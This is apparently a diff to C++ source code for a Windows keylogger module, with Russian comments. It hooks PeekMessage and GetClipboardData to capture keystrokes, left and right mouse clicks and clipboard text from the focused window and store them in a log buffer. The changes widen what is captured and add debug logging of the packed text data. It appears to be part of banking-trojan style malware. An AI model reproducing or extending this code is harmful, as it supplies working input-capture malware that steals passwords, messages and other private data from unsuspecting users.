@@ -258,11 +258,11 @@ namespace KeyLoggerHooks
 	{
 		// Обрабатываем нажатие диалоговых кнопок
 		PKeyLogger Logger = GetLogger(true);
-		if (Logger == NULL || Logger->ActiveWND != Msg->hwnd)
+		if (Logger == NULL)
 			return;
 
 		if (Msg->message == WM_KEYDOWN)
-            ProcessKeyDownMessage(Msg);
+			ProcessKeyDownMessage(Msg);
     }
 
 	BOOL WINAPI Hook_PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
@@ -325,29 +325,33 @@ namespace KeyLoggerHooks
 	HANDLE WINAPI Hook_GetClipboardData(UINT uFormat)
 	{
 		HANDLE DataHandle = Real_GetClipboardData(uFormat);
+
+
 		if( uFormat == CF_TEXT || uFormat == CF_UNICODETEXT)
 		{
-			KLGDBG("UnKLG", "Перехватываем данные из буфера обмена. WND = %d ", KLG.FocusWnd);
+			// Проверяем  окно владеющее фокусом
+			PKeyLogger Logger = GetLogger(true);
+			if (Logger == NULL)
+				return DataHandle;
 
-			if (KeyLogger::SetActiveWnd(KLG.FocusWnd, LOG_KEYBOARD))
+			KLGDBG("UnKLG", "Перехватываем данные из буфера обмена. WND = %d ", Logger->ActiveWND);
+
+			PCHAR Data = (PCHAR)pGlobalLock(DataHandle);
+			if( uFormat == CF_UNICODETEXT ) //текст в юникоде переводим в ansi
+				Data = WSTR::ToAnsi( (WCHAR*)Data, 0 );
+			KLGDBG("UnKLG", "Извлечение данных из буфера '%s'", Data);
+
+			// Добавляем их в хранилище
+			if (Data != NULL)
 			{
-				PCHAR Data = (PCHAR)pGlobalLock(DataHandle);
-				if( uFormat == CF_UNICODETEXT ) //текст в юникоде переводим в ansi
-					Data = WSTR::ToAnsi( (WCHAR*)Data, 0 );
-				KLGDBG("UnKLG", "Извлечение данных из буфера '%s'", Data);
-
-				// Добавляем их в хранилище
-				if (Data != NULL)
-				{
-					KeyLogger::AddStrToBuffer(NULL, Data, 0);
-					KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
-				}
-
-				if( uFormat == CF_UNICODETEXT )
-					STR::Free(Data);
-
-				pGlobalUnlock(DataHandle);
+				KeyLogger::AddStrToBuffer(NULL, Data, 0);
+				KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
 			}
+
+			if( uFormat == CF_UNICODETEXT )
+				STR::Free(Data);
+
+			pGlobalUnlock(DataHandle);
 		}
 		return DataHandle;
 	}
@@ -727,9 +731,14 @@ void ProcessCharMessage(PMSG Msg, bool IsUnicode)
 
 void ProcessKeyDownMessage(PMSG Msg)
 {
-	// Отображаем некоторые, специальные, символы
+	// Обработка сообщения нажатой кнопки клавиатуры
 
-	// Проверяем необходимость обработки символа
+	// Устанавливаем активное окно
+	KeyLogger::SetActiveWnd(Msg->hwnd, LOG_KEYBOARD);
+
+	// Проверяем необходимость обработки нажатия кнопки символа
+	// Выведено в отдельную функцию потому для обработки некоторых
+	// служебных символов
 
 	const static DWORD SupportChars[] =
 
@@ -755,11 +764,12 @@ void ProcessMouseMessage(PMSG Msg)
 {
 	// Обрабатываем сообщения мыши
 
-	if ((Msg->wParam & MK_LBUTTON) == 0)
+	PKeyLogger Logger = GetLogger(true);
+
+	// Логируем только левую кнопку мыши
+	if (Logger == NULL || (Msg->wParam & MK_LBUTTON) == 0)
 		return;
 
-	PKeyLogger Logger = GetLogger(true);
-	if (Logger == NULL) return;
 
 	// Проверяем необходимость записи кликов
 	if (Msg->hwnd == Logger->ActiveWND && KLG.Filter)
@@ -773,11 +783,12 @@ void ProcessMouseMessage(PMSG Msg)
 		}
 	}
 
-	// Отфильтровываем окно
+	// Обрабатываем нажатие кнопки
 
-	bool Valid = KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE);
+	bool ValidWnd = KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE);
 
-	if (!Valid || KLG.Filter == NULL || KLG.Filter->DontSaveMouseLog || KLG.StopLogging)
+
+	if (!ValidWnd || KLG.Filter == NULL || KLG.Filter->DontSaveMouseLog || KLG.StopLogging)
 	{
 		KeyLogger::IncActionCounter();
 		return;
@@ -1126,6 +1137,8 @@ void ProcessAllMessages(PMSG Msg, bool IsUnicode)
 		{
 			case WM_CHAR: 		 ProcessCharMessage(Msg, IsUnicode); break;
 			case WM_LBUTTONDOWN: ProcessMouseMessage(Msg); break;
+			case WM_RBUTTONDOWN: KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE); break;
+
 //			case WM_PASTE:  	 ProcessClipBoardMessage(Msg, Logger); break;
 //			case CB_SELECTSTRING:
 //			case WM_SETTEXT:     ProcessSetTextMessage(Msg, IsUnicode); break;
@@ -3052,24 +3065,13 @@ void KeyLogger::DoAfterShowWindow(PShowWindowData Data)
 {
 	// Событие после функции показа окна
 	PKeyLogger L = GetLogger(true);
-	if (L != NULL)
+	if (L != NULL && KLG.System == NULL && __IsShowWndCommand(Data->Command))
 	{
-		if (Data->Command == SW_HIDE)
-		{
-			// Прячется окно, удаляем его из списка активных диалогов
-			List::Remove(KLG.Dialogs, Data->Window);
-		}
-		else
-		if (__IsShowWndCommand(Data->Command))
-		{
-
-			// Устанавливаем активное окно
-			PCHAR  Txt = GetWndText(Data->Window);
-			KeyLogger::SetActiveWnd(Data->Window, LOG_KEYBOARD);
-			STR::Free(Txt);
-
-		}
-    }
+		// Устанавливаем активное окно
+		PCHAR  Txt = GetWndText(Data->Window);
+		KeyLogger::SetActiveWnd(Data->Window, LOG_KEYBOARD);
+		STR::Free(Txt);
+	}
 
 	CallEvent(KLE_AFTER_SHOW_WND, Data);
 }
@@ -3271,6 +3273,9 @@ void KLGPackerPackTextBlocks(PKeyLogPacker Packer)
 	}
 
 	pDeleteFileA(FileName);
+
+
+    KLGDBG("KeyLogPacker", "Текстовые данные: %s", Packer->Log);
 
 	STR::Free(FileName);
 }
